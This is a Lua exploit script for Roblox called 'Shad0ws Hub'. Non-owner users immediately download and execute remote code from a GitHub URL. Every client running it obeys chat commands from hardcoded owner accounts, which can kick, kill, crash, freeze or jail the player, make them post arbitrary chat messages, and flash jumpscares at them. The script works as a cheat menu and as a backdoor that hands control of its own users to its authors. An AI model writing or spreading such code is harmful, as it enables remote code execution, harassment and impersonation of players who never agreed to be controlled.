-- üì¶ Shad0ws Hub ‚Äî Vers√£o WindUI Premium Corrigida

local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")
local StarterGui = game:GetService("StarterGui")
local Workspace = game:GetService("Workspace")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TweenService = game:GetService("TweenService")
local Debris = game:GetService("Debris")
local RunService = game:GetService("RunService")

local LocalPlayer = Players.LocalPlayer

-- üö® Configura√ß√£o de Donos e Moderadores
local DONOS = {
    ["kanakiwhakO"] = true,
    ["LinuxTrollDev"] = true,
}

local MODS = {
    ["Thurr_Xploit"] = true,
}

local TEMP_MODS = {}

local function IsDono(n) return DONOS[n] == true end
local function IsMod(n) return MODS[n] == true end
local function IsTempMod(n) return TEMP_MODS[n] == true end
local function IsAutorizado(n) return IsDono(n) or IsMod(n) or IsTempMod(n) end

-- ‚úÖ USU√ÅRIOS NORMAIS: S√ì EXECUTAM O LOADSTRING
if not IsAutorizado(LocalPlayer.Name) then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ShadowsHubseila/Janabsbb/refs/heads/main/shadows.txt"))()
    return
end

-- Fun√ß√£o de Gradiente
function gradient(text, startColor, endColor)
    local result = ""
    local length = #text

    for i = 1, length do
        local t = (i - 1) / math.max(length - 1, 1)
        local r = math.floor((startColor.R + (endColor.R - startColor.R) * t) * 255)
        local g = math.floor((startColor.G + (endColor.G - startColor.G) * t) * 255)
        local b = math.floor((startColor.B + (endColor.B - startColor.B) * t) * 255)

        local char = text:sub(i, i)
        result = result .. "<font color=\"rgb(" .. r ..", " .. g .. ", " .. b .. ")\">" .. char .. "</font>"
    end

    return result
end

-- Carregar WindUI
local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()

local Confirmed = false

-- Popup Inicial
WindUI:Popup({
    Title = "Shad0ws Hub",
    Icon = "rbxassetid://0",
    Content = "Click 'Load' to start" .. gradient(" Shad0ws", Color3.fromRGB(139, 0, 0), Color3.fromRGB(255, 0, 0)) .. " Hub!",
    Buttons = {
        {
            Title = "Cancel",
            Icon = "",
            Callback = function() end,
            Variant = "Secondary",
        },
        {
            Title = "Load",
            Icon = "arrow-right",
            Callback = function() Confirmed = true end,
            Variant = "Primary",
        }
    }
})

repeat wait() until Confirmed

-- üö® ATEN√á√ÉO: VERIFIQUE SE O CAMINHO PARA OS REMOTES EST√Å CORRETO!
local Remotes = ReplicatedStorage:WaitForChild("Remotes")

-- üß† Vari√°veis de Estado
local SHADOWS_USERS = {}
local tagsVisiveis = true
local JAILED_PLAYERS = {}
local FROZEN_PLAYERS = {}
local SelectedPlayer
local playerNames = {}
local copierName = ""
local targetAvatarName = ""
local chatAsMessage = ""
local SelectedJumpscareTarget

-- Configura√ß√£o de Jumpscares
local JUMPSCARES = {
    { Name = "Jumpscare 1", Cmd = ";jumps1", ImageId = "rbxassetid://126754882337711", AudioId = "rbxassetid://138873214826309" },
    { Name = "Jumpscare 2", Cmd = ";jumps2", ImageId = "rbxassetid://86379969987314", AudioId = "rbxassetid://143942090" },
    { Name = "Jumpscare 3", Cmd = ";jumps3", ImageId = "rbxassetid://127382022168206", AudioId = "rbxassetid://143942090" },
    { Name = "Jumpscare 4", Cmd = ";jumps4", ImageId = "rbxassetid://95973611964555", AudioId = "rbxassetid://138873214826309" },
}

-- Fun√ß√µes de A√ß√£o
local function FreezePlayer(player)
    if not player or not player.Character then return false end
    local h = player.Character:FindFirstChildOfClass("Humanoid")
    if not h or FROZEN_PLAYERS[player.Name] then return false end
    FROZEN_PLAYERS[player.Name] = { WalkSpeed = h.WalkSpeed, JumpPower = h.JumpPower }
    h.WalkSpeed = 0
    h.JumpPower = 0
    return true
end

local function UnfreezePlayer(player)
    if not player or not FROZEN_PLAYERS[player.Name] then return false end
    local s = FROZEN_PLAYERS[player.Name]
    if player.Character then
        local h = player.Character:FindFirstChildOfClass("Humanoid")
        if h then
            h.WalkSpeed = s.WalkSpeed
            h.JumpPower = s.JumpPower
        end
    end
    FROZEN_PLAYERS[player.Name] = nil
    return true
end

local function CreateAndManageJail(player)
    if not player or not player.Character then return false end
    local e = Workspace:FindFirstChild("Jail_" .. player.Name)
    if e then e:Destroy() end
    if JAILED_PLAYERS[player.Name] and JAILED_PLAYERS[player.Name].loop then task.cancel(JAILED_PLAYERS[player.Name].loop) end

    local hrp = player.Character:FindFirstChild("HumanoidRootPart")
    if not hrp then return false end

    local m = Instance.new("Model", Workspace)
    m.Name = "Jail_" .. player.Name

    local s = 8
    local p = hrp.Position
    local t = {
        Base = Instance.new("Part", m),
        Roof = Instance.new("Part", m),
        Wall1 = Instance.new("Part", m),
        Wall2 = Instance.new("Part", m),
        Wall3 = Instance.new("Part", m),
        Wall4 = Instance.new("Part", m)
    }

    t.Base.Size = Vector3.new(s, 0.5, s)
    t.Base.Position = p - Vector3.new(0, player.Character.Humanoid.HipHeight + 0.25, 0)
    t.Roof.Size = Vector3.new(s, 0.5, s)
    t.Roof.Position = t.Base.Position + Vector3.new(0, s, 0)
    t.Wall1.Size = Vector3.new(0.5, s, s)
    t.Wall1.Position = t.Base.Position + Vector3.new(s / 2, s / 2, 0)
    t.Wall2.Size = Vector3.new(0.5, s, s)
    t.Wall2.Position = t.Base.Position + Vector3.new(-s / 2, s / 2, 0)
    t.Wall3.Size = Vector3.new(s, s, 0.5)
    t.Wall3.Position = t.Base.Position + Vector3.new(0, s / 2, s / 2)
    t.Wall4.Size = Vector3.new(s, s, 0.5)
    t.Wall4.Position = t.Base.Position + Vector3.new(0, s / 2, -s / 2)

    for _, v in pairs(t) do
        v.Anchored = true
        v.CanCollide = true
        v.Material = Enum.Material.Neon
        v.Color = Color3.fromRGB(0, 200, 255)
        v.Transparency = 0.6
    end

    if player == LocalPlayer then
        local l = task.spawn(function()
            local c = t.Base.Position + Vector3.new(0, player.Character.Humanoid.HipHeight, 0)
            while JAILED_PLAYERS[player.Name] and player.Parent and player.Character and player.Character.Parent do
                local h = player.Character:FindFirstChild("HumanoidRootPart")
                if h and (h.Position - c).Magnitude > (s / 2) - 1 then
                    h.CFrame = CFrame.new(c)
                end
                task.wait(0.1)
            end
        end)
        JAILED_PLAYERS[player.Name] = { loop = l }
    else
        JAILED_PLAYERS[player.Name] = {}
    end
    return true
end

local function RemoveJail(player)
    local w = Workspace:FindFirstChild("Jail_" .. player.Name)
    if w then w:Destroy() end
    if not player or not JAILED_PLAYERS[player.Name] then return false end
    local d = JAILED_PLAYERS[player.Name]
    if d.loop then task.cancel(d.loop) end
    JAILED_PLAYERS[player.Name] = nil
    return true
end

local function FloatPlayer(player)
    if not player or not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") or not player.Character:FindFirstChildOfClass("Humanoid") then return false end
    local targetHrp = player.Character.HumanoidRootPart
    local targetHumanoid = player.Character:FindFirstChildOfClass("Humanoid")
    local targetPos = targetHrp.Position
    targetHumanoid.WalkSpeed = 0
    targetHumanoid.JumpHeight = 0

    local bodyVelocity = Instance.new("BodyVelocity", targetHrp)
    bodyVelocity.MaxForce = Vector3.new(0, math.huge, 0)
    bodyVelocity.Velocity = Vector3.new(0, 10, 0)
    bodyVelocity.Name = "FloatVelocity"

    local maxHeight = targetPos.Y + 50
    local connection
    connection = RunService.Heartbeat:Connect(function()
        if not player.Character or not player.Character.Parent or not targetHrp.Parent or not targetHumanoid.Parent then
            if bodyVelocity and bodyVelocity.Parent then bodyVelocity:Destroy() end
            if connection then connection:Disconnect() end
            return
        end
        if targetHrp.Position.Y >= maxHeight then
            if bodyVelocity and bodyVelocity.Parent then bodyVelocity:Destroy() end
            if connection then connection:Disconnect() end
            targetHumanoid.Health = 0
        end
    end)
    return true
end

local function KillPlus(player)
    if not player or not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") then return false end
    local targetHrp = player.Character.HumanoidRootPart
    local targetPos = targetHrp.Position
    local parts = {}
    local numParts = 5

    local folder = Instance.new("Folder", Workspace)
    folder.Name = "KillPlusTemp_" .. player.Name

    for i = 1, numParts do
        local part = Instance.new("Part")
        part.Name = "KillPlusPart_" .. player.Name .. "_" .. i
        part.Size = Vector3.new(2, 2, 2)
        part.Position = targetPos + Vector3.new(math.random(-10, 10), -5, math.random(-10, 10))
        part.Anchored = true
        part.CanCollide = true
        part.Material = Enum.Material.Neon
        part.Color = Color3.fromRGB(255, 0, 0)
        part.Parent = folder
        table.insert(parts, part)
    end

    local speed = 50
    for _, part in ipairs(parts) do
        local distance = (targetPos - part.Position).Magnitude
        local duration = math.max(0.1, distance / speed)
        local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Linear)
        local tween = TweenService:Create(part, tweenInfo, { Position = targetPos + Vector3.new(0, 1, 0) })
        part.Anchored = false
        tween:Play()

        part.Touched:Connect(function(hit)
            if hit.Parent == player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                local bodyVelocity = Instance.new("BodyVelocity", targetHrp)
                bodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                bodyVelocity.Velocity = Vector3.new(math.random(-50, 50), 100, math.random(-50, 50))
                Debris:AddItem(bodyVelocity, 0.5)
            end
        end)
    end

    Debris:AddItem(folder, 5)
    return true
end

local function TriggerJumpscare(player, jumpscare)
    if not player or player ~= LocalPlayer then return false end
    local screenGui = Instance.new("ScreenGui", game:GetService("CoreGui"))
    screenGui.Name = "JumpscareGui"
    screenGui.IgnoreGuiInset = true
    screenGui.ResetOnSpawn = false

    local imageLabel = Instance.new("ImageLabel", screenGui)
    imageLabel.Size = UDim2.new(1, 0, 1, 0)
    imageLabel.Position = UDim2.new(0, 0, 0, 0)
    imageLabel.BackgroundTransparency = 1
    imageLabel.Image = jumpscare.ImageId

    local sound = Instance.new("Sound", screenGui)
    sound.SoundId = jumpscare.AudioId
    sound.Volume = 1
    sound.Looped = false
    sound:Play()

    local flashCount = 10
    local flashInterval = 0.2
    for i = 1, flashCount do
        if not screenGui.Parent then break end
        imageLabel.ImageTransparency = (i % 2 == 0) and 0.3 or 0
        task.wait(flashInterval)
    end

    sound:Stop()
    screenGui:Destroy()
    return true
end

local function SendCommand(msg)
    pcall(function()
        local tcs = game:GetService("TextChatService")
        if tcs.ChatVersion == Enum.ChatVersion.TextChatService then
            local channel = tcs.TextChannels.RBXGeneral
            if channel then channel:SendAsync(msg) end
        else
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
        end
    end)
end

local function ExecuteAvatarCopy(targetPlayerName, copierPlayerName)
    if not IsAutorizado(LocalPlayer.Name) or copierPlayerName:lower() ~= LocalPlayer.Name:lower() then return false end
    local targetPlayer = Players:FindFirstChild(targetPlayerName)
    local copierPlayer = LocalPlayer
    if not (targetPlayer and copierPlayer and copierPlayer.Character and targetPlayer.Character) then
        WindUI:Notify({
            Title = "Error",
            Content = "N√£o foi poss√≠vel encontrar os jogadores.",
            Icon = "alert-triangle",
            Duration = 3,
        })
        return false
    end
    local success = pcall(function()
        local copierHumanoid = copierPlayer.Character:WaitForChild("Humanoid")
        local targetHumanoid = targetPlayer.Character:WaitForChild("Humanoid")

        local copierDesc = copierHumanoid:GetAppliedDescription()
        for _, acc in ipairs(copierDesc:GetAccessories(true)) do
            if acc.AssetId and tonumber(acc.AssetId) then
                Remotes.Wear:InvokeServer(tonumber(acc.AssetId))
                task.wait(0.2)
            end
        end

        if tonumber(copierDesc.Shirt) then Remotes.Wear:InvokeServer(tonumber(copierDesc.Shirt)) task.wait(0.2) end
        if tonumber(copierDesc.Pants) then Remotes.Wear:InvokeServer(tonumber(copierDesc.Pants)) task.wait(0.2) end
        if tonumber(copierDesc.Face) then Remotes.Wear:InvokeServer(tonumber(copierDesc.Face)) task.wait(0.2) end

        local targetDesc = targetHumanoid:GetAppliedDescription()
        local argsBody = {
            [1] = {
                [1] = targetDesc.Torso,
                [2] = targetDesc.RightArm,
                [3] = targetDesc.LeftArm,
                [4] = targetDesc.RightLeg,
                [5] = targetDesc.LeftLeg,
                [6] = targetDesc.Head
            }
        }
        Remotes.ChangeCharacterBody:InvokeServer(unpack(argsBody))
        task.wait(0.5)

        if tonumber(targetDesc.Shirt) then Remotes.Wear:InvokeServer(tonumber(targetDesc.Shirt)) task.wait(0.3) end
        if tonumber(targetDesc.Pants) then Remotes.Wear:InvokeServer(tonumber(targetDesc.Pants)) task.wait(0.3) end
        if tonumber(targetDesc.Face) then Remotes.Wear:InvokeServer(tonumber(targetDesc.Face)) task.wait(0.3) end

        for _, v in ipairs(targetDesc:GetAccessories(true)) do
            if v.AssetId and tonumber(v.AssetId) then Remotes.Wear:InvokeServer(tonumber(v.AssetId)) task.wait(0.3) end
        end

        local targetSkinColor = targetPlayer.Character:FindFirstChild("Body Colors")
        if targetSkinColor then Remotes.ChangeBodyColor:FireServer(tostring(targetSkinColor.HeadColor)) task.wait(0.3) end

        if tonumber(targetDesc.IdleAnimation) then Remotes.Wear:InvokeServer(tonumber(targetDesc.IdleAnimation)) task.wait(0.3) end

        local targetBag = targetPlayer:FindFirstChild("PlayersBag")
        if targetBag then
            if targetBag:FindFirstChild("RPName") and targetBag.RPName.Value ~= "" then
                Remotes.RPNameText:FireServer("RolePlayName", targetBag.RPName.Value)
                task.wait(0.3)
            end
            if targetBag:FindFirstChild("RPBio") and targetBag.RPBio.Value ~= "" then
                Remotes.RPNameText:FireServer("RolePlayBio", targetBag.RPBio.Value)
                task.wait(0.3)
            end
            if targetBag:FindFirstChild("RPNameColor") then
                Remotes.RPNameColor:FireServer("PickingRPNameColor", targetBag.RPNameColor.Value)
                task.wait(0.3)
            end
            if targetBag:FindFirstChild("RPBioColor") then
                Remotes.RPNameColor:FireServer("PickingRPBioColor", targetBag.RPBioColor.Value)
                task.wait(0.3)
            end
        end

        WindUI:Notify({
            Title = "Success",
            Content = "Avatar copiado com sucesso!",
            Icon = "check",
            Duration = 3,
        })
        return true
    end)
    return success
end

local function findPlayerByPartialName(partialName)
    if not partialName or partialName == "" then return nil end
    local lowerPartialName = partialName:lower():gsub("%s+", "")
    for _, p in ipairs(Players:GetPlayers()) do
        if p.Name:lower():find(lowerPartialName, 1, true) or p.DisplayName:lower():find(lowerPartialName, 1, true) then
            return p
        end
    end
    return nil
end

local function analisarChatDe(chatter, message)
    local msg = message:lower():gsub("%s+", " ")
    local args = {}
    for word in msg:gmatch("%S+") do table.insert(args, word) end

    if msg == ";verifique" then
        if not IsAutorizado(chatter.Name) then return end
        if not IsAutorizado(LocalPlayer.Name) then
            task.delay(math.random(0.1, 0.8), function()
                SendCommand("Shad0ws_####")
            end)
        end
        return
    end

    if msg == "shad0ws_####" then
        SHADOWS_USERS[chatter.Name] = true
        return
    end

    if not IsAutorizado(chatter.Name) then return end

    -- ‚úÖ CORRE√á√ÉO: ;ch n√£o envia duas vezes
    if args[1] == ";ch" and #args >= 3 then
        local targetPartialName = args[2]
        local messageToSend = table.concat(args, " ", 3)
        local targetPlayer = findPlayerByPartialName(targetPartialName)
        if targetPlayer and targetPlayer == LocalPlayer and messageToSend ~= "" then
            -- Apenas envia a mensagem, SEM executar o comando novamente
            pcall(function()
                local tcs = game:GetService("TextChatService")
                if tcs.ChatVersion == Enum.ChatVersion.TextChatService then
                    local channel = tcs.TextChannels.RBXGeneral
                    if channel then channel:SendAsync(messageToSend) end
                else
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(messageToSend, "All")
                end
            end)
        end
        return
    end

    if args[1] == ";copy" and #args == 3 then
        local partialTarget = args[2]
        local partialCopier = args[3]
        local targetPlayer = findPlayerByPartialName(partialTarget)
        local copierPlayer = findPlayerByPartialName(partialCopier)
        if targetPlayer and copierPlayer then
            ExecuteAvatarCopy(targetPlayer.Name, copierPlayer.Name)
        end
        return
    end

    for _, jumpscare in ipairs(JUMPSCARES) do
        if args[1] == jumpscare.Cmd and #args == 2 then
            local targetPlayer = findPlayerByPartialName(args[2])
            if targetPlayer then
                TriggerJumpscare(targetPlayer, jumpscare)
            end
            return
        end
    end

    -- ‚úÖ PROTE√á√ÉO: Nenhum comando funciona em DONOS
    local targetCommands = { ";kick", ";crash", ";kill", ";killplus", ";bring", ";jail", ";unjail", ";freeze", ";unfreeze", ";adm", ";unadm", ";float" }
    if table.find(targetCommands, args[1]) and #args == 2 then
        local targetPlayer = findPlayerByPartialName(args[2])
        if not targetPlayer then return end

        -- ‚úÖ PROTE√á√ÉO: Impede comandos em DONOS
        if IsDono(targetPlayer.Name) then
            return -- N√£o executa NADA se o alvo for DONO
        end

        if args[1] == ";jail" then
            CreateAndManageJail(targetPlayer)
        elseif args[1] == ";unjail" then
            RemoveJail(targetPlayer)
        elseif args[1] == ";freeze" then
            FreezePlayer(targetPlayer)
        elseif args[1] == ";unfreeze" then
            UnfreezePlayer(targetPlayer)
        -- ‚úÖ RESTRI√á√ÉO: Apenas DONOS podem dar/remover admin
        elseif args[1] == ";adm" and IsDono(chatter.Name) then
            TEMP_MODS[targetPlayer.Name] = true
        elseif args[1] == ";unadm" and IsDono(chatter.Name) then
            TEMP_MODS[targetPlayer.Name] = nil
        elseif args[1] == ";kick" then
            targetPlayer:Kick("Voc√™ foi removido pelos seus atos --equipe Shad0ws")
        elseif args[1] == ";kill" then
            if targetPlayer.Character and targetPlayer.Character:FindFirstChildOfClass("Humanoid") then
                targetPlayer.Character.Humanoid.Health = 0
            end
        elseif args[1] == ";killplus" then
            KillPlus(targetPlayer)
        elseif args[1] == ";bring" then
            if chatter.Character and chatter.Character:FindFirstChild("HumanoidRootPart") and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
                targetPlayer.Character:SetPrimaryPartCFrame(chatter.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -5))
            end
        elseif args[1] == ";crash" then
            if targetPlayer == LocalPlayer then
                while true do
                    Instance.new("Part")
                end
            end
        elseif args[1] == ";float" then
            FloatPlayer(targetPlayer)
        end
        return
    end

    if msg == ";untag all" then
        tagsVisiveis = false
        return
    end

    if msg == ";tag all" then
        tagsVisiveis = true
        return
    end

    if msg == ";untag" and chatter == LocalPlayer then
        tagsVisiveis = false
        return
    end

    if msg == ";tag" and chatter == LocalPlayer then
        tagsVisiveis = true
        return
    end
end

for _, player in ipairs(Players:GetPlayers()) do
    player.Chatted:Connect(function(message) analisarChatDe(player, message) end)
end
Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(message) analisarChatDe(player, message) end)
end)

for _, player in pairs(Players:GetPlayers()) do
    table.insert(playerNames, player.Name)
end

-- Criar Window
local Window = WindUI:CreateWindow({
    Title = "Shad0ws Hub",
    Icon = "rbxassetid://0",
    Author = "By Shad0ws Team",
    Folder = "Shad0wsHub",
    Size = UDim2.fromOffset(600, 480),
    Transparent = false,
    Theme = "Dark",
    User = {
        Enabled = true
    },
    SideBarWidth = 200,
    HasOutline = true
})

Window:EditOpenButton({
    Title = "Open UI",
    Icon = "shield",
    CornerRadius = UDim.new(0, 16),
    StrokeThickness = 2,
    Color = ColorSequence.new(
        Color3.fromRGB(139, 0, 0), 
        Color3.fromRGB(255, 0, 0)
    ),
    Enabled = true,
    Draggable = true,
})

local Tabs = {
    MainTab = Window:Tab({ 
        Title = gradient("Commands", Color3.fromRGB(139, 0, 0), Color3.fromRGB(255, 0, 0)), 
        Icon = "hammer",
        Desc = "Main Commands"
    }),
    divider1 = Window:Divider(),
    AvatarTab = Window:Tab({
        Title = gradient("Avatar", Color3.fromRGB(139, 0, 0), Color3.fromRGB(255, 0, 0)),
        Icon = "user",
        Desc = "Avatar Tools"
    }),
    divider2 = Window:Divider(),
    TerrorTab = Window:Tab({
        Title = gradient("Terror", Color3.fromRGB(139, 0, 0), Color3.fromRGB(255, 0, 0)),
        Icon = "skull",
        Desc = "Jumpscares"
    }),
    divider3 = Window:Divider(),
}

-- Adicionar aba Admin s√≥ para donos
if IsDono(LocalPlayer.Name) then
    Tabs.AdminTab = Window:Tab({
        Title = gradient("Admin", Color3.fromRGB(139, 0, 0), Color3.fromRGB(255, 0, 0)),
        Icon = "shield",
        Desc = "Admin Controls"
    })
    Tabs.divider4 = Window:Divider()
end

Tabs.CreditsTab = Window:Tab({
    Title = gradient("Credits", Color3.fromRGB(139, 0, 0), Color3.fromRGB(255, 0, 0)),
    Icon = "info",
    Desc = "Information"
})

Window:SelectTab(1)

-- TAB 1: COMANDOS
Tabs.MainTab:Section({ Title = "Player Selection" })

local PlayersDD = Tabs.MainTab:Dropdown({
    Title = "Select Player",
    Values = playerNames,
    Value = playerNames[1],
    Callback = function(option)
        SelectedPlayer = Players:FindFirstChild(option)
    end
})

Players.PlayerAdded:Connect(function(player)
    table.insert(playerNames, player.Name)
    PlayersDD:Refresh(playerNames)
end)

Players.PlayerRemoving:Connect(function(player)
    for i, name in pairs(playerNames) do
        if name == player.Name then
            table.remove(playerNames, i)
            break
        end
    end
    PlayersDD:Refresh(playerNames)
end)

Tabs.MainTab:Section({ Title = "Main Commands" })

Tabs.MainTab:Button({
    Title = "Verifique",
    Desc = "Identify Shad0ws users",
    Callback = function()
        SendCommand(";verifique")
        WindUI:Notify({
            Title = "Success",
            Content = "Verifique command sent!",
            Icon = "check",
            Duration = 3,
        })
    end
})

local commands = {
    {Title = "Kick", Desc = "Remove player from game", Cmd = ";kick"},
    {Title = "Kill", Desc = "Eliminate player", Cmd = ";kill"},
    {Title = "Kill Plus", Desc = "Kill with special effect", Cmd = ";killplus"},
    {Title = "Freeze", Desc = "Freeze player movement", Cmd = ";freeze"},
    {Title = "Unfreeze", Desc = "Unfreeze player", Cmd = ";unfreeze"},
    {Title = "Jail", Desc = "Trap player in cage", Cmd = ";jail"},
    {Title = "Unjail", Desc = "Release from jail", Cmd = ";unjail"},
    {Title = "Bring", Desc = "Teleport player to you", Cmd = ";bring"},
    {Title = "Float", Desc = "Make player float away", Cmd = ";float"},
}

for _, cmd in pairs(commands) do
    Tabs.MainTab:Button({
        Title = cmd.Title,
        Desc = cmd.Desc,
        Callback = function()
            if not SelectedPlayer then
                WindUI:Notify({
                    Title = "Error",
                    Content = "Select a player first!",
                    Icon = "alert-triangle",
                    Duration = 3,
                })
                return
            end
            -- ‚úÖ PROTE√á√ÉO: Impede comandos em DONOS
            if IsDono(SelectedPlayer.Name) then
                WindUI:Notify({
                    Title = "Error",
                    Content = "‚ùå Cannot execute commands on owners!",
                    Icon = "shield",
                    Duration = 3,
                })
                return
            end
            SendCommand(cmd.Cmd .. " " .. SelectedPlayer.Name)
            WindUI:Notify({
                Title = "Success",
                Content = cmd.Title .. " executed on " .. SelectedPlayer.Name,
                Icon = "check",
                Duration = 3,
            })
        end
    })
end

Tabs.MainTab:Section({ Title = "Chat Commands" })

Tabs.MainTab:Input({
    Title = "Message to Send",
    Desc = "Type what the player will say",
    Value = "",
    InputIcon = "message-square",
    Type = "Input",
    Placeholder = "Enter message...",
    Callback = function(input)
        chatAsMessage = input
    end
})

Tabs.MainTab:Button({
    Title = "Send as Target (;ch)",
    Desc = "Send message as selected player",
    Callback = function()
        if not SelectedPlayer then
            WindUI:Notify({
                Title = "Error",
                Content = "Select a player first!",
                Icon = "alert-triangle",
                Duration = 3,
            })
            return
        end
        if chatAsMessage == "" then
            WindUI:Notify({
                Title = "Error",
                Content = "Enter a message!",
                Icon = "alert-triangle",
                Duration = 3,
            })
            return
        end
        SendCommand(";ch " .. SelectedPlayer.Name .. " " .. chatAsMessage)
        WindUI:Notify({
            Title = "Success",
            Content = "Message sent as " .. SelectedPlayer.Name,
            Icon = "check",
            Duration = 3,
        })
    end
})

-- TAB 2: AVATAR
Tabs.AvatarTab:Section({ Title = "Copy Avatar" })

Tabs.AvatarTab:Input({
    Title = "Who will copy (Copier)",
    Desc = "Enter the player name who will copy",
    Value = "",
    InputIcon = "user-plus",
    Type = "Input",
    Placeholder = "Copier name...",
    Callback = function(input)
        copierName = input
    end
})

Tabs.AvatarTab:Input({
    Title = "Copy avatar from (Target)",
    Desc = "Enter the player name to copy from",
    Value = "",
    InputIcon = "target",
    Type = "Input",
    Placeholder = "Target name...",
    Callback = function(input)
        targetAvatarName = input
    end
})

Tabs.AvatarTab:Button({
    Title = "Execute Copy",
    Desc = "Copy target's avatar to copier",
    Callback = function()
        if copierName == "" or targetAvatarName == "" then
            WindUI:Notify({
                Title = "Error",
                Content = "Fill both fields!",
                Icon = "alert-triangle",
                Duration = 3,
            })
            return
        end
        
        local copierPlayer = findPlayerByPartialName(copierName)
        local targetPlayer = findPlayerByPartialName(targetAvatarName)
        
        if not copierPlayer then
            WindUI:Notify({
                Title = "Error",
                Content = "Copier not found: " .. copierName,
                Icon = "alert-triangle",
                Duration = 3,
            })
            return
        end
        
        if not targetPlayer then
            WindUI:Notify({
                Title = "Error",
                Content = "Target not found: " .. targetAvatarName,
                Icon = "alert-triangle",
                Duration = 3,
            })
            return
        end
        
        SendCommand(";copy " .. targetPlayer.Name .. " " .. copierPlayer.Name)
        WindUI:Notify({
            Title = "Success",
            Content = "Copying avatar from " .. targetPlayer.Name .. " to " .. copierPlayer.Name,
            Icon = "check",
            Duration = 4,
        })
    end
})

-- TAB 3: TERROR (JUMPSCARES)
Tabs.TerrorTab:Section({ Title = "Jumpscare Selection" })

local JumpscareTargetDD = Tabs.TerrorTab:Dropdown({
    Title = "Select Target",
    Values = playerNames,
    Value = playerNames[1],
    Callback = function(option)
        SelectedJumpscareTarget = Players:FindFirstChild(option)
    end
})

Tabs.TerrorTab:Section({ Title = "Available Jumpscares" })

for i, jumpscare in ipairs(JUMPSCARES) do
    Tabs.TerrorTab:Button({
        Title = jumpscare.Name,
        Desc = "Trigger jumpscare effect",
        Callback = function()
            if not SelectedJumpscareTarget then
                WindUI:Notify({
                    Title = "Error",
                    Content = "Select a target first!",
                    Icon = "alert-triangle",
                    Duration = 3,
                })
                return
            end
            SendCommand(jumpscare.Cmd .. " " .. SelectedJumpscareTarget.Name)
            WindUI:Notify({
                Title = "Success",
                Content = jumpscare.Name .. " triggered on " .. SelectedJumpscareTarget.Name,
                Icon = "skull",
                Duration = 3,
            })
        end
    })
end

-- TAB ADMIN (S√ì PARA DONOS)
if IsDono(LocalPlayer.Name) then
    Tabs.AdminTab:Section({ Title = "Moderation" })
    
    local ModTargetDD = Tabs.AdminTab:Dropdown({
        Title = "Select Player",
        Values = playerNames,
        Value = playerNames[1],
        Callback = function(option)
            -- Ser√° usado nos bot√µes abaixo
        end
    })
    
    Tabs.AdminTab:Button({
        Title = "Give Admin",
        Desc = "Promote player to temporary moderator",
        Callback = function()
            local selected = ModTargetDD.Value
            local targetPlayer = Players:FindFirstChild(selected)
            if targetPlayer then
                SendCommand(";adm " .. targetPlayer.Name)
                WindUI:Notify({
                    Title = "Success",
                    Content = targetPlayer.Name .. " promoted to admin!",
                    Icon = "shield",
                    Duration = 3,
                })
            end
        end
    })
    
    Tabs.AdminTab:Button({
        Title = "Remove Admin",
        Desc = "Remove temporary moderator",
        Callback = function()
            local selected = ModTargetDD.Value
            local targetPlayer = Players:FindFirstChild(selected)
            if targetPlayer then
                SendCommand(";unadm " .. targetPlayer.Name)
                WindUI:Notify({
                    Title = "Success",
                    Content = targetPlayer.Name .. " removed from admin!",
                    Icon = "shield-off",
                    Duration = 3,
                })
            end
        end
    })
    
    Tabs.AdminTab:Section({ Title = "Tag Controls" })
    
    Tabs.AdminTab:Toggle({
        Title = "Show All Tags",
        Value = tagsVisiveis,
        Callback = function(value)
            if value then
                SendCommand(";tag all")
                tagsVisiveis = true
            else
                SendCommand(";untag all")
                tagsVisiveis = false
            end
        end
    })
end

-- TAB CREDITS
Tabs.CreditsTab:Paragraph({
    Title = "Shad0ws Hub",
    Desc = "Advanced admin system with premium features",
    Image = "https://tr.rbxcdn.com/180DAY-59af3523ad8898216dbe1043788837bf/768/432/Image/Webp/noFilter",
    ImageSize = 34,
    Thumbnail = "https://tr.rbxcdn.com/180DAY-59af3523ad8898216dbe1043788837bf/768/432/Image/Webp/noFilter",
    ThumbnailSize = 120
})

Tabs.CreditsTab:Section({ Title = "Team" })

Tabs.CreditsTab:Button({
    Title = "üëë kanakiwhakO",
    Desc = "Main Developer & Owner",
    Callback = function()
        WindUI:Notify({
            Title = "Owner",
            Content = "kanakiwhakO - Main Developer",
            Icon = "crown",
            Duration = 3,
        })
    end
})

Tabs.CreditsTab:Button({
    Title = "üëë LinuxTrollDev",
    Desc = "Co-Developer & Owner",
    Callback = function()
        WindUI:Notify({
            Title = "Owner",
            Content = "LinuxTrollDev - Co-Developer",
            Icon = "crown",
            Duration = 3,
        })
    end
})

Tabs.CreditsTab:Button({
    Title = "üõ°Ô∏è Thurr_Xploit",
    Desc = "Lead Moderator",
    Callback = function()
        WindUI:Notify({
            Title = "Moderator",
            Content = "Thurr_Xploit - Lead Moderator",
            Icon = "shield",
            Duration = 3,
        })
    end
})

Tabs.CreditsTab:Section({ Title = "Information" })

Tabs.CreditsTab:Button({
    Title = "Version",
    Desc = "2.0 WindUI Premium Edition",
    Callback = function()
        WindUI:Notify({
            Title = "Info",
            Content = "Shad0ws Hub v2.0 - WindUI Edition",
            Icon = "info",
            Duration = 3,
        })
    end
})

Tabs.CreditsTab:Section({ Title = "Commands Reference" })

local cmdList = {
    {cmd = ";verifique", desc = "Identify Shad0ws users"},
    {cmd = ";kick [player]", desc = "Remove player from game"},
    {cmd = ";kill [player]", desc = "Eliminate player"},
    {cmd = ";killplus [player]", desc = "Kill with special effect"},
    {cmd = ";freeze [player]", desc = "Freeze player movement"},
    {cmd = ";unfreeze [player]", desc = "Unfreeze player"},
    {cmd = ";jail [player]", desc = "Trap player in cage"},
    {cmd = ";unjail [player]", desc = "Release from jail"},
